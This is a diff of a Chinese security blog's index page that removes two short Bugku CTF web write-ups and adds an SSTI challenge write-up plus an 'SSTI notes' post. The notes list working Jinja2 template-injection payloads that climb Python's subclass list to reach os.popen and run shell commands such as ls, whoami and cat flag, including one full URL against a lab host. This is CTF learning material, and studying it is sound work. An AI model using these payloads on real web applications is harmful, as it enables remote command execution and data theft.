@@ -164,192 +164,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-bugku-web-头等舱" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/">bugku-web-头等舱</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/" class="archive-article-date">
-  	<time datetime="2021-07-31T14:13:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>头等舱=flag在header<br>没意思，开burp两分钟，得flag五秒钟</p>
-<img src="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-变量1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/">bugku-web-变量1</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/" class="archive-article-date">
-  	<time datetime="2021-07-31T13:58:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开后是php代码</p>
-<img src="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/1.PNG" class="" title="1.PNG">
-
-<p>逐行解释<br>第三行：包含flag1.php<br>第四行：接收一个args变量，若非空，则运行<br>第五行：给$args赋值（并没有用，只是为了让新手看着更直观）<br>第六行：利用正则表达式匹配，若不匹配，则程序直接die<br>第九行：输出$$args(eval没有用)</p>
-<p>关于正则表达式，网上这个解释感觉非常好——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^\w+$&#x2F; 两个&#x2F; &#x2F; 表明正则表达式的开始与结束 ^开始字符，$结束字符 \w 包含【a-z,A-Z,_,0-9】中的字符，+代表可以有一个，或多个\w </span><br><span class="line"> 总的加起来意思是 以[a-z,A-Z,_,0-9]中的其中一个字符开始，中间可以有任意个[a-z,A-Z,_,0-9]字符，最后再以[a-z,A-Z,_,0-9]中的一个字符结束 比如适合的有：a,a09,a_01,001 不适合的有a-5，@12，￥12，中文字符，这些都不在[a-z,A-Z,_,0-9]范围里面</span><br></pre></td></tr></table></figure>
-<p>相当于传入的值只能是大小写字母或数字，字符只能是“_”<br>所以不能传入别的字符，不能传shell了</p>
-<p>另外推荐一个比较好的正则表达式网站——<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a></p>
-<p>然后就是了解到：超全局变量——<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.superglobals.php">https://www.php.net/manual/zh/language.variables.superglobals.php</a></p>
-<p>这里用到$GLOBALS</p>
-<p>所以传值?args=GLOBALS,得到flag</p>
-<img src="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/2.PNG" class="" title="2.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
     <article id="post-bugku-web-eval" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1102,6 +916,223 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/07/30/bugku-web-Simple-SSTI-2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-bugku-web-Simple-SSTI-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/30/bugku-web-Simple-SSTI-1/">bugku-web-Simple_SSTI_1</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/07/30/bugku-web-Simple-SSTI-1/" class="archive-article-date">
+  	<time datetime="2021-07-30T02:11:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首先建议先看一下关于ssti的基础知识——</p>
+<a href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/" title="ssti笔记">ssti笔记</a>
+<p>（虽然对这道题没什么用）</p>
+<h2 id="开始做题——"><a href="#开始做题——" class="headerlink" title="开始做题——"></a>开始做题——</h2><h2 id="打开题目后只有一行字"><a href="#打开题目后只有一行字" class="headerlink" title="打开题目后只有一行字"></a>打开题目后只有一行字</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/1.PNG" class="" title="1.PNG">
+<hr>
+<h2 id="意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显"><a href="#意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显" class="headerlink" title="意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显"></a>意思应该是参数为flag，所以试了试在url行给flag赋值，发现有回显</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/2.PNG" class="" title="2.PNG">
+
+<hr>
+<h2 id="然后测试是否存在ssti注入，发现有注入"><a href="#然后测试是否存在ssti注入，发现有注入" class="headerlink" title="然后测试是否存在ssti注入，发现有注入"></a>然后测试是否存在ssti注入，发现有注入</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/3.PNG" class="" title="3.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/4.PNG" class="" title="4.PNG">
+
+<hr>
+<h2 id="打开页面源代码，发现下方有注释"><a href="#打开页面源代码，发现下方有注释" class="headerlink" title="打开页面源代码，发现下方有注释"></a>打开页面源代码，发现下方有注释</h2><p>意思好像是让我们找secret_key<br>学习flask后发现，这个secret_key是flask的一个系统参数</p>
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/20.PNG" class="" title="20.PNG">
+
+<hr>
+<h2 id="扫了一下目录，发现一个-console"><a href="#扫了一下目录，发现一个-console" class="headerlink" title="扫了一下目录，发现一个/console"></a>扫了一下目录，发现一个/console</h2><p>打开后发现让我们输pin码，然后就可以使用shell指令，这里可以用笔记中的方法获取主机名，配合cookie构造，不过这里不需要shell，所以没有用</p>
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/18.PNG" class="" title="18.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/19.PNG" class="" title="19.PNG">
+
+<hr>
+<h2 id="直接用系统指令config-secret-key查secret-key，得出flag"><a href="#直接用系统指令config-secret-key查secret-key，得出flag" class="headerlink" title="直接用系统指令config.secret_key查secret_key，得出flag"></a>直接用系统指令config.secret_key查secret_key，得出flag</h2><img src="/2021/07/30/bugku-web-Simple-SSTI-1/17.PNG" class="" title="17.PNG">
+
+
+
+<p>下面我也根据笔记进行了测试——</p>
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/5.PNG" class="" title="5.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/6.PNG" class="" title="6.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/7.PNG" class="" title="7.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/8.PNG" class="" title="8.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/9.PNG" class="" title="9.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/10.PNG" class="" title="10.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/11.PNG" class="" title="11.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/12.PNG" class="" title="12.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/13.PNG" class="" title="13.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/14.PNG" class="" title="14.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/15.PNG" class="" title="15.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/16.PNG" class="" title="16.PNG">
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/21.PNG" class="" title="21.PNG">
+
+
+<p>报错界面（也可以用于输入pin后运行shell，或者查看部分源代码）（方法：随便输错点什么）</p>
+<img src="/2021/07/30/bugku-web-Simple-SSTI-1/22.PNG" class="" title="22.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/30/bugku-web-Simple-SSTI-1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-ssti笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/">ssti笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2021-07-30T02:03:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>推荐视频：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1zi4y1x7QM">https://www.bilibili.com/video/BV1zi4y1x7QM</a><br>（星盟战队，h3h3da大佬，yyds!!)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for i in range(10)%&#125;</span><br><span class="line">&#123;%print(i)%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</span><br><span class="line"></span><br><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">（查popen,os,sys）</span><br><span class="line">popen:&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302]&#125;&#125;</span><br><span class="line">(替换302到别的数直到找到popen（）的数值）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302].__init__&#125;&#125;</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[302].__init__.__globals__&#125;&#125;</span><br><span class="line">测popen，os</span><br><span class="line"></span><br><span class="line">若有os:&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;].popen(&quot;ls&quot;).read()&#125;&#125;</span><br><span class="line">(ls可以换成各种shell）</span><br><span class="line"></span><br><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[&quot;os&quot;].popen(&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line">(得到主机名，用于构造pin）</span><br><span class="line">http:&#x2F;&#x2F;114.67.246.176:11940&#x2F;?flag&#x3D;&#123;&#123;%27%27.__class__.__base__.__subclasses__()[425].__init__.__globals__[%22os%22].popen(%22cat%20flag%22).read()&#125;&#125;</span><br><span class="line">（直接搜flag）</span><br><span class="line"></span><br></pre></td></tr></table></figure></span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/30/ssti%E7%AC%94%E8%AE%B0/">展开全文 >></a>
         </p>
       
 
